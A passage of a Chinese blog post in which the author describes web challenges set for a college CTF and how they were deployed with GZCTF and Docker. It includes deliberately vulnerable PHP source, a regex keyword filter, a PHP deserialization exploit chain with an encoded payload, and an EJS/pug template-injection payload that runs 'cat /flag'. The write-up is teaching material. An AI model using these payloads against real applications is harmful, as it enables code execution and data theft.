&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A_nd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fl4g</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;ary1[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Share</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func1-&gt;<span class="title function_ invoke__">sas</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;func2-&gt;<span class="title function_ invoke__">S4S</span>(<span class="variable">$this</span>-&gt;rce);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>waf.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>hint.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-1-1-2-wp"><a href="#2-1-1-2-wp" class="headerlink" title="2.1.1.2 wp"></a>2.1.1.2 wp</h4><p>主要是__get和__call魔法函数的利用，然后还需要注意一些php的小知识，对于源码中出现过但是没声明过的属性我们在构造exp的时候可以自己创建（也是这一点让这一题出现了原题也有的非预期），这里只放预期解</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Study</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A_nd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Share</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Share</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;rce=<span class="string">&#x27;/H3r3_1s_th3_flag&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;func1=<span class="keyword">new</span> <span class="title class_">Study</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;func1-&gt;fl4g=<span class="keyword">new</span> <span class="title class_">A_nd</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;func1-&gt;fl4g-&gt;ary1=<span class="keyword">array</span>(<span class="string">&quot;fl4g&quot;</span>=&gt;<span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;func2=<span class="keyword">new</span> <span class="title class_">Study</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;func2-&gt;fl4g=<span class="keyword">new</span> <span class="title class_">A_nd</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;func2-&gt;fl4g-&gt;ary1=<span class="keyword">array</span>(<span class="string">&quot;fl4g&quot;</span>=&gt;<span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;func2-&gt;ary2=<span class="keyword">array</span>(<span class="string">&quot;S4S&quot;</span>=&gt;<span class="string">&quot;readfile&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//双写flag绕过检测：O%3A5%3A%22Share%22%3A3%3A%7Bs%3A3%3A%22rce%22%3Bs%3A17%3A%22%2FH3r3_1s_th3_flflagag%22%3Bs%3A5%3A%22func1%22%3BO%3A5%3A%22Study%22%3A1%3A%7Bs%3A4%3A%22fl4g%22%3BO%3A4%3A%22A_nd%22%3A2%3A%7Bs%3A10%3A%22%00A_nd%00fl4g%22%3BN%3Bs%3A4%3A%22ary1%22%3Ba%3A1%3A%7Bs%3A4%3A%22fl4g%22%3Bi%3A1%3B%7D%7D%7Ds%3A5%3A%22func2%22%3BO%3A5%3A%22Study%22%3A2%3A%7Bs%3A4%3A%22fl4g%22%3BO%3A4%3A%22A_nd%22%3A2%3A%7Bs%3A10%3A%22%00A_nd%00fl4g%22%3BN%3Bs%3A4%3A%22ary1%22%3Ba%3A1%3A%7Bs%3A4%3A%22fl4g%22%3Bi%3A1%3B%7D%7Ds%3A4%3A%22ary2%22%3Ba%3A1%3A%7Bs%3A3%3A%22S4S%22%3Bs%3A8%3A%22readfile%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-1-2-登录得flag"><a href="#2-1-2-登录得flag" class="headerlink" title="2.1.2 登录得flag"></a>2.1.2 登录得flag</h3><p>此题考查的是2023ciscn华南分区赛中出现的考点，考察的是ejs模板引擎注入和nodejs里emoji字符的编码问题，比较有意思的一道题</p>
+<h4 id="2-1-2-1-源码"><a href="#2-1-2-1-源码" class="headerlink" title="2.1.2.1 源码"></a>2.1.2.1 源码</h4><ul>
+<li>app.js</li>
+</ul>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/image-20231204152710572.png" alt="image-20231204152710572"></p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/image-20231204152718960.png" alt="image-20231204152718960"></p>
+<h4 id="2-1-2-2-wp"><a href="#2-1-2-2-wp" class="headerlink" title="2.1.2.2 wp"></a>2.1.2.2 wp</h4><ul>
+<li>账号处绕过</li>
+</ul>
+<p>账号校验处可以用js中数组的特性绕过 (需要用json格式传)</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-4.png" alt="img"></p>
+<p>代码中发现当我们登录成功时我们传入的username会被pug模板渲染出来，结合前面引入的ejs，可以判断出考查的模板注入，由于没有任何限制，所以直接利用网上的payload就行（这里要配合pug模板的#{}来插入变量）</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在该payload前面加上admin和利用我们上一步提到的特性即可绕过检测。</p>
+<ul>
+<li>密码处绕过</li>
+</ul>
+<p>js 采用的是 Unicode 字符集，UTF-16 编码，一个 emoji 表情是两个字符编码组成的</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984772-5.png" alt="img"></p>
+<p>密码校验处其实就是少校验了原密码的第一个字符和最后一个字符，所以对应的我们要保留原密码第一个emoji表情的后一位字符和最后一个emoji表情的前一位字符</p>
+<p>我们可以利用charCodeAt方法结合toString方法输出所需字符的Unicode编码</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-6.png" alt="img"></p>
+<p>最终构造出json格式的payload</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/image-20231204152746833.png" alt="image-20231204152746833"></p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-7.png" alt="img"></p>
+<p>回到admin目录即可看到flag</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-8.png" alt="img"></p>
+<h1 id="0x03-题目部署"><a href="#0x03-题目部署" class="headerlink" title="0x03 题目部署"></a>0x03 题目部署</h1><p>平台搭建好后在管理界面可以新建比赛，根据需求设置好各项数值后，来到编辑题目处新建题目，以web的Study_And_Share为例</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-9.png" alt="img"></p>
+<p>填好基础信息后进入到题目编辑界面，这里比较重要的是容器镜像这里</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-10.png" alt="img"></p>
+<p>我们使用的是github上开源的docker模板：<a target="_blank" rel="noopener" href="https://github.com/CTF-Archives/ctf-docker-template">https://github.com/CTF-Archives/ctf-docker-template</a></p>
+<p>而这道题只需要一个nginx加php的基础环境就可以了，所以将该模板下载下来把源码加到src目录即可</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-11.png" alt="img"></p>
+<p>由于题目有一个文件包含考点，为了不给非预期读flag，还需要修改service目录下的docker-entrypoint.sh文件，自定义flag名称</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-12.png" alt="img"></p>
+<p>然后将题目环境上传至服务器，然后在题目的Dockerfile目录下指定镜像名字构造容器镜像（注意名字要全小写，否则会报错）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t study_and_share .</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-13.png" alt="img"></p>
+<p>然后回到上一步将对应的镜像名字填上去即可，点击开启测试容器，就可以看到生成了测试入口</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-14.png" alt="img"></p>
+<p>进去测试一下</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-15.png" alt="img"></p>
+<p>然后这里显示的默认flag模板，我们可以自己去题目信息那里改</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-16.png" alt="img"></p>
+<p>保存重开测试容器即可</p>
+<p><img src="/2023/12/03/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E9%99%A2%E8%B5%9Bweb%E6%96%B9%E5%90%91%E5%87%BA%E9%A2%98/1701544984773-17.png" alt="img"></p>
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>圆了出题梦，虽然只是院赛，但是也算是学校的第一个CTF比赛了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%87%BA%E9%A2%98/" rel="tag"># 出题</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/" rel="prev" title="Java反序列化之 CC1 链从0到1（手撕EXP）">
+      <i class="fa fa-chevron-left"></i> Java反序列化之 CC1 链从0到1（手撕EXP）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%9F%BA%E4%BA%8EGZCTF%E7%9A%84%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">0x01 基于GZCTF的比赛平台搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88ubantu%EF%BC%89%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 测试服务器（ubantu）环境准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-GZCTF%E5%B9%B3%E5%8F%B0%E9%83%A8%E7%BD%B2"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 GZCTF平台部署</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E9%83%A8%E5%88%86web%E8%B5%9B%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">0x02 部分web赛题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-web"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-Study-And-Share"><span class="nav-number">3.1.1.</span> <span class="nav-text">2.1.1 Study_And_Share</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-1-%E6%BA%90%E7%A0%81"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">2.1.1.1 源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-1-2-wp"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">2.1.1.2 wp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-2-%E7%99%BB%E5%BD%95%E5%BE%97flag"><span class="nav-number">3.1.2.</span> <span class="nav-text">2.1.2 登录得flag</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-1-%E6%BA%90%E7%A0%81"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">2.1.2.1 源码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-1-2-2-wp"><span class="nav-number">3.1.2.2.</span> <span class="nav-text">2.1.2.2 wp</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E9%A2%98%E7%9B%AE%E9%83%A8%E7%BD%B2"><span class="nav-number">4.</span> <span class="nav-text">0x03 题目部署</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">0x04 总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="YDJ"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">YDJ</p>
+  <div class="site-description" itemprop="description">我这一生，如履薄冰</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">发布</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">YDJ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">23k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:17</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
